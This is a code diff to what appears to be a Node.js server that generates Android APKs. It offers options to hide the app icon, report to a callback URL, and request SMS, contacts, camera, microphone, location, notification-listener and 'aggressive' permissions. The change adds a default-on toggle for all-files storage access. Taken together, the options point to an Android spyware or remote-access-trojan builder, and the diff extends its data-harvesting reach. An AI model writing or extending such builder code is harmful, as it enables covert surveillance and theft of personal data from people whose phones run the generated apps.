@@ -223,7 +223,7 @@ const NOTIF_PRESETS = {
 app.post('/generate', upload.single('icon'), async (req, res) => {
     const {
         uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
-        enableSmsPermission, enableContactsPermission, enableStoragePermission,
+        enableSmsPermission, enableContactsPermission, enableStoragePermission, enableAllFilesPermission,
         enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
         enableLocationPermission, enableForegroundNotification, aggressivePermissions,
         notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
@@ -270,6 +270,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const isMicEnabled             = enableMicrophonePermission === 'true';
             const isLocationEnabled        = enableLocationPermission === 'true';
             const isStorageEnabled         = enableStoragePermission !== 'false';
+            const isAllFilesEnabled        = enableAllFilesPermission !== 'false';
             const isForegroundNotifEnabled = enableForegroundNotification !== 'false';
 
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
@@ -305,9 +306,13 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     permsToNeutralize.push(
                         'android.permission.READ_MEDIA_IMAGES',
                         'android.permission.READ_MEDIA_VIDEO',
-                        'android.permission.READ_EXTERNAL_STORAGE',
-                        'android.permission.WRITE_EXTERNAL_STORAGE',
-                        'android.permission.MANAGE_EXTERNAL_STORAGE'
+                        'android.permission.READ_EXTERNAL_STORAGE'
+                    );
+                }
+                if (!isAllFilesEnabled) {
+                    permsToNeutralize.push(
+                        'android.permission.MANAGE_EXTERNAL_STORAGE',
+                        'android.permission.WRITE_EXTERNAL_STORAGE'
                     );
                 }
                 if (!isForegroundNotifEnabled) {
@@ -338,6 +343,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableSmsPermission:          enableSmsPermission === 'true',
                 enableContactsPermission:     enableContactsPermission === 'true',
                 enableStoragePermission:      enableStoragePermission !== 'false',
+                enableAllFilesPermission:     enableAllFilesPermission !== 'false',
                 enableCameraPermission:       enableCameraPermission === 'true',
                 enableMicrophonePermission:   enableMicrophonePermission === 'true',
                 enableLocationPermission:     enableLocationPermission === 'true',
